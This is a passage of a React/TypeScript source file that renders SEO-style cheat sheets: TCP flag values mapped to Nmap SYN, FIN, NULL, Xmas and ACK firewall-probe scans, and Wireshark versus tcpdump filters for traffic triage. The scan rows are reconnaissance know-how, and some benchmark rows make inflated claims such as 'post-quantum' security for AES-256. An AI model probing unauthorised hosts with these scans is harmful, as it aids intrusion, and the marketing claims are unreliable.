        col4: "Closed: RST+ACK (0x14) | Filtered: No Response",
        codeCol: 2,
      },
      {
        col1: "SYN + ACK (Server Handshake Step 2)",
        col2: "0x12 (Decimal 18 | SYN=2 + ACK=16)",
        col3: "Client replies ACK (0x10) → ESTABLISHED",
        col4: "Unsolicited SYN+ACK triggers immediate RST (0x04)",
        codeCol: 2,
      },
      {
        col1: "PSH + ACK (Interactive Data Push)",
        col2: "0x18 (Decimal 24 | PSH=8 + ACK=16)",
        col3: "Flushes socket buffer to application immediately",
        col4: "Standard HTTP/SSH payload transfer state",
        codeCol: 2,
      },
      {
        col1: "FIN / NULL / Xmas Scan (-sF/-sN/-sX)",
        col2: "FIN: 0x01 | NULL: 0x00 | Xmas: 0x29",
        col3: "Open Port: No Response (RFC 9293 drop)",
        col4: "Closed Port: Replies RST+ACK (0x14) on POSIX",
        codeCol: 2,
      },
      {
        col1: "ACK Firewall Rule Probe (-sA)",
        col2: "0x10 (Decimal 16 | tcp-ack)",
        col3: "Unfiltered (Open or Closed): Replies RST (0x04)",
        col4: "Stateful Firewall (Filtered): Silent Drop / ICMP",
        codeCol: 2,
      },
      {
        col1: "FIN + ACK vs RST + ACK Teardown",
        col2: "FIN+ACK: 0x11 (17) | RST+ACK: 0x14 (20)",
        col3: "0x11 initiates graceful 4-way close (TIME_WAIT)",
        col4: "0x14 aborts connection immediately (port closed/IPS)",
        codeCol: 2,
      },
    ],
  },

  "wireshark-tcpdump-filter-builder": {
    heading: "2026 Wireshark Display Filter vs tcpdump BPF Capture Syntax Table",
    quickAnswer:
      "Wireshark uses two distinct filter engines: Berkeley Packet Filters (BPF, shared with `tcpdump`) filter raw packets at the kernel NIC driver before writing to disk (`host 10.0.0.5 and tcp port 443`), whereas Wireshark Display Filters parse deep Layer-7 protocol fields (`http.request.method == \"POST\"` or `tls.handshake.type == 1`) during post-capture analysis.",
    formulaOrSyntax: "tcpdump -ni any 'tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn' -w syn_scan.pcap",
    benchmarks: [
      "Zero-Overhead Capture Flag: tcpdump -ni eth0 -s 0 -w capture.pcap",
      "SYN-Only BPF Expression: tcp[13] == 2 (or tcp[tcpflags] == tcp-syn)",
      "TLS SNI Hostname Filter: tls.handshake.extensions_server_name contains \"domain\"",
    ],
    headers: [
      "Packet Analysis Goal",
      "Wireshark Display Filter",
      "tcpdump BPF Capture Filter",
      "SOC / Network Triage Purpose",
    ],
    rows: [
      {
        col1: "Isolate Host IP & Port",
        col2: "ip.addr == 10.10.14.5 && tcp.port == 443",
        col3: "host 10.10.14.5 and tcp port 443",
        col4: "Inspect bidirectional flow for a single endpoint",
        codeCol: 2,
      },
      {
        col1: "Detect TCP SYN Port Scans",
        col2: "tcp.flags.syn == 1 && tcp.flags.ack == 0",
        col3: "tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn",
        col4: "Spots Nmap -sS sweeps & SYN flood DDoS bursts",
        codeCol: 3,
      },
      {
        col1: "Hunt HTTP POST & Auth Flows",
        col2: "http.request.method == \"POST\" || http.response.code >= 400",
        col3: "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)",
        col4: "Extracts form logins, API calls & 4xx/5xx errors",
        codeCol: 2,
      },
      {
        col1: "Inspect TLS ClientHello & SNI",
        col2: "tls.handshake.type == 1 && tls.handshake.extensions_server_name",
        col3: "tcp port 443 and (tcp[((tcp[12]&0xf0)>>2)] = 0x16)",
        col4: "Identifies destination domain names inside HTTPS",
        codeCol: 2,
      },
      {
        col1: "Audit DNS Queries & AXFR",
        col2: "dns.flags.response == 0 || dns.qry.type == 252",
        col3: "port 53",
        col4: "Detects C2 DNS tunneling & zone transfer attempts",
        codeCol: 2,
      },
      {
        col1: "Exclude Your Own SSH Session",
        col2: "!(tcp.port == 22 && ip.addr == 192.168.1.50)",
        col3: "not (tcp port 22 and host 192.168.1.50)",
        col4: "Prevents feedback loop when running remote tcpdump",
        codeCol: 3,
      },
    ],
  },
};

const CATEGORY_BENCHMARK_ROWS: Record<ToolCategory, CheatSheetRow[]> = {
  cybersecurity: [
    {
      col1: "Execution & Privacy Architecture",
      col2: "100% Client-Side WebCrypto / JS Sandbox",
      col3: "0 Bytes Sent to External Servers",
      col4: "Safe for internal SOC & authorized lab artifacts",
      codeCol: 2,
    },
    {
      col1: "NIST SP 800-53 / OWASP Alignment",
      col2: "OWASP ASVS v4.0.3 / NIST CSF 2.0",
      col3: "Deterministic Rule & Header Verification",
      col4: "Maps findings to actionable hardening controls",
      codeCol: 2,
    },
    {
      col1: "Cryptographic & Entropy Standard",
      col2: "SHA-256 / AES-256-GCM / Argon2id",
      col3: "≥ 128-bit Effective Security Margin",
      col4: "Meets 2026 post-quantum & zero-trust baselines",
      codeCol: 2,
    },
  ],
  android: [
    {
      col1: "Android OS Compatibility Target",
      col2: "Android 13 / 14 / 15 / 16 (API 33–36)",
      col3: "AOSP + OneUI / HyperOS / Pixel UI",
      col4: "Supports modern Scoped Storage & ADB Wireless",
      codeCol: 2,
    },
    {
      col1: "Privilege & Safety Boundary",
      col2: "Non-Destructive User-Space Diagnostics",
      col3: "Reversible via ADB / GSM MMI Codes",
      col4: "Preserves OEM warranty & Knox fuse integrity",
      codeCol: 2,
    },
    {
      col1: "Telemetry Latency & Sampling",
      col2: "60Hz – 240Hz Frame & Sensor Polling",
      col3: "< 16.6ms Frame Budget (60 FPS Lock)",
      col4: "Calibrated for mobile gaming & hardware triage",
      codeCol: 2,
    },
  ],
  apps: [
    {
      col1: "Computation Engine Precision",
      col2: "IEEE 754 Double-Precision Float64",
      col3: "Real-Time Zero-Latency Recalculation",
      col4: "Instant interactive output without page reloads",
      codeCol: 2,
    },
    {
      col1: "Data Persistence & Export",
      col2: "Zero-Upload Local Browser Memory",
      col3: "1-Click Copy / JSON / CSV / Audio Export",
      col4: "Financial & personal inputs never leave device",
      codeCol: 2,
    },
    {
      col1: "2026 Regulatory & Spec Baseline",
      col2: "Updated 2026–27 Formulas & Thresholds",
      col3: "Verified Against Official Spec Tables",
      col4: "Eliminates stale pre-2025 rate assumptions",
      codeCol: 2,
    },
  ],
  ai: [
    {
      col1: "Tokenizer & Model Architecture",
      col2: "tiktoken (o200k_base / cl100k_base) + GGUF",
      col3: "1 Token ≈ 0.75 English Words (~4 Chars)",
      col4: "Calibrated for 2026 Frontier & Open-Weight LLMs",
      codeCol: 2,
    },
    {
      col1: "Context Window & KV Cache Scaling",
      col2: "8k / 32k / 128k / 1M+ Token Contexts",
      col3: "FP16 vs Q8_0 vs Q4_K_M Quantization",
      col4: "Accounts for FlashAttention & prompt caching",
      codeCol: 2,
    },
    {
      col1: "Inference Cost & Throughput Metric",
      col2: "USD per 1M Input / Cached / Output Tokens",
      col3: "Memory Bandwidth (GB/s) ÷ Model Size (GB)",
      col4: "Optimizes self-hosted GPU vs cloud API ROI",
      codeCol: 2,
    },
  ],
  tech: [
    {
      col1: "Hardware & Protocol Spec Version",
      col2: "2026 IEEE / JEDEC / VESA / PCI-SIG",
      col3: "High-Precision Browser API Telemetry",
      col4: "Cross-checked against hardware datasheets",
      codeCol: 2,
    },
    {
      col1: "Real-Time Measurement Loop",
      col2: "requestAnimationFrame / WebAudio / WebGL",
      col3: "Sub-Millisecond HighResTimeStamp (DOMHighRes)",
      col4: "Runs natively on desktop, laptop & mobile browsers",
      codeCol: 2,
    },
    {
      col1: "Safety Headroom & Efficiency Factor",
      col2: "80 PLUS / PFC 0.8–0.9 / 25% Surge Margin",
      col3: "Continuous Load ≤ 75% Rated Peak Capacity",
      col4: "Prevents thermal throttling & voltage droop",
      codeCol: 2,
    },
  ],
};

function buildFallbackSpec(tool: Tool): CheatSheetSpec {
  const sec0 = tool.secondaryKeywords[0] || tool.primaryKeyword;
  const sec1 = tool.secondaryKeywords[1] || `${tool.category} benchmark`;
  const sec2 = tool.secondaryKeywords[2] || "client-side verification";
  const leadFaq = tool.faq[0];

  const dynamicRows: CheatSheetRow[] = tool.features.slice(0, 3).map((feat, idx) => ({
    col1: feat.title,
    col2: tool.secondaryKeywords[idx] || tool.primaryKeyword,
    col3: feat.description.length > 78 ? `${feat.description.slice(0, 75)}...` : feat.description,
    col4: tool.useCases[idx % tool.useCases.length]?.title || "Production Verification",
    codeCol: 2,
  }));

  return {
    heading: `2026 Quick-Reference Cheat Sheet & Benchmark Table: ${tool.name}`,
    quickAnswer: leadFaq
      ? `${leadFaq.answer} Use this interactive ${tool.primaryKeyword} above to test ${sec0}, ${sec1}, and ${sec2} locally in your browser with zero server uploads.`
      : `${tool.subhead} This 100% client-side ${tool.primaryKeyword} calculates and validates ${sec0} and ${sec1} instantaneously in your browser memory.`,
    formulaOrSyntax: `Target Keyword Spec: ${tool.primaryKeyword}  |  Modules: ${tool.features.map((f) => f.title).slice(0, 3).join(" • ")}`,
    benchmarks: [
      `Primary Focus: ${tool.primaryKeyword}`,
      `Core Capability: ${sec0}`,
      "Privacy Mode: 100% Client-Side (Zero Upload)",
    ],
    headers: [
      "Technical Parameter / Module",
      "Standard / Keyword Spec",
      "Architecture & Validation Rule",
      "Operational Use Case (2026)",
    ],
    rows: [...dynamicRows, ...CATEGORY_BENCHMARK_ROWS[tool.category]],
  };
}

export function FastWinCheatSheet({ tool }: { tool: Tool }) {
  const isFastWin = FAST_WIN_TOOL_SLUGS.includes(tool.slug);
  const spec = CUSTOM_CHEAT_SHEETS[tool.slug] ?? buildFallbackSpec(tool);

  return (
    <section
      className="entry-content"
      aria-labelledby={`cheat-sheet-${tool.slug}`}
    >
      <div className="block-head-b justify-between flex-wrap gap-2">
        <h2 id={`cheat-sheet-${tool.slug}`} className="heading flex items-center gap-2">
          <Table2 className="h-5 w-5 text-accent shrink-0" />
          <span>{spec.heading}</span>
        </h2>
        {isFastWin && (
          <span className="inline-flex items-center gap-1 rounded-xs bg-[#ff6a00]/10 border border-[#ff6a00]/30 px-2.5 py-0.5 font-heading text-[11px] font-bold uppercase tracking-wider text-accent">
            <Sparkles className="h-3 w-3" />
            2026 Verified Reference
          </span>
        )}
      </div>

      {/* Featured Snippet / AI Overview Quick Answer Box */}
      <div className="mb-5 rounded-md border-l-4 border-l-[#ff6a00] border border-border bg-surface p-4 sm:p-5 shadow-soft">
        <div className="flex items-center justify-between flex-wrap gap-2 mb-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent flex items-center gap-1.5">
            <Sparkles className="h-3.5 w-3.5" />
            Quick Answer &amp; 2026 Technical Summary ({tool.primaryKeyword})
          </span>
          <span className="text-[11px] font-mono-code text-text-muted">
            Updated 2026 Standard
          </span>
        </div>

        <p className="text-sm sm:text-[15px] text-text leading-relaxed m-0">
          {spec.quickAnswer}
        </p>

        <div className="mt-3 rounded border border-border bg-background px-3 py-2 font-mono-code text-xs text-text overflow-x-auto flex items-center gap-2">
          <Terminal className="h-3.5 w-3.5 text-accent shrink-0" />
          <code>{spec.formulaOrSyntax}</code>
        </div>

        <div className="mt-3 grid gap-2 sm:grid-cols-3">
          {spec.benchmarks.map((bm) => (
            <div
              key={bm}
              className="flex items-center gap-1.5 rounded-xs border border-border bg-background px-2.5 py-1.5 text-xs text-text-muted"
            >
              <CheckCircle2 className="h-3.5 w-3.5 text-accent shrink-0" />
              <span className="truncate" title={bm}>
                {bm}
              </span>
            </div>
          ))}
        </div>
      </div>

      {/* Semantic Crawl-Optimized HTML Reference Table */}
      <div className="overflow-x-auto rounded border border-border bg-surface shadow-soft">
        <table className="w-full border-collapse text-left text-xs sm:text-sm">
          <thead>
            <tr className="border-b-2 border-border bg-background font-heading text-xs uppercase tracking-wider text-text">
              <th scope="col" className="py-3 px-3.5 font-bold">
                {spec.headers[0]}
              </th>
              <th scope="col" className="py-3 px-3.5 font-bold">
                {spec.headers[1]}
              </th>
              <th scope="col" className="py-3 px-3.5 font-bold">
                {spec.headers[2]}
              </th>
              <th scope="col" className="py-3 px-3.5 font-bold">
                {spec.headers[3]}
              </th>
            </tr>
          </thead>
          <tbody className="divide-y divide-border">
            {spec.rows.map((row, idx) => (
              <tr
                key={`${row.col1}-${idx}`}
                className="hover:bg-background/60 transition-colors"
              >
                <td className="py-2.5 px-3.5 font-medium text-text align-top">
                  {row.codeCol === 1 ? (
                    <code className="rounded bg-background px-1.5 py-0.5 font-mono-code text-xs text-accent border border-border">
                      {row.col1}
                    </code>
                  ) : (
                    row.col1
                  )}
                </td>
                <td className="py-2.5 px-3.5 text-text align-top">
                  {row.codeCol === 2 ? (
                    <code className="rounded bg-background px-1.5 py-0.5 font-mono-code text-xs text-accent border border-border break-all">
                      {row.col2}
                    </code>
                  ) : (
                    row.col2
                  )}
                </td>
                <td className="py-2.5 px-3.5 text-text-muted align-top">
                  {row.codeCol === 3 ? (
                    <code className="rounded bg-background px-1.5 py-0.5 font-mono-code text-xs text-accent border border-border break-all">
                      {row.col3}
                    </code>
                  ) : (
                    row.col3
                  )}
                </td>
                <td className="py-2.5 px-3.5 text-text-muted align-top">
                  {row.codeCol === 4 ? (
                    <code className="rounded bg-background px-1.5 py-0.5 font-mono-code text-xs text-accent border border-border break-all">
                      {row.col4}
                    </code>
                  ) : (
                    row.col4
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </section>
  );
}
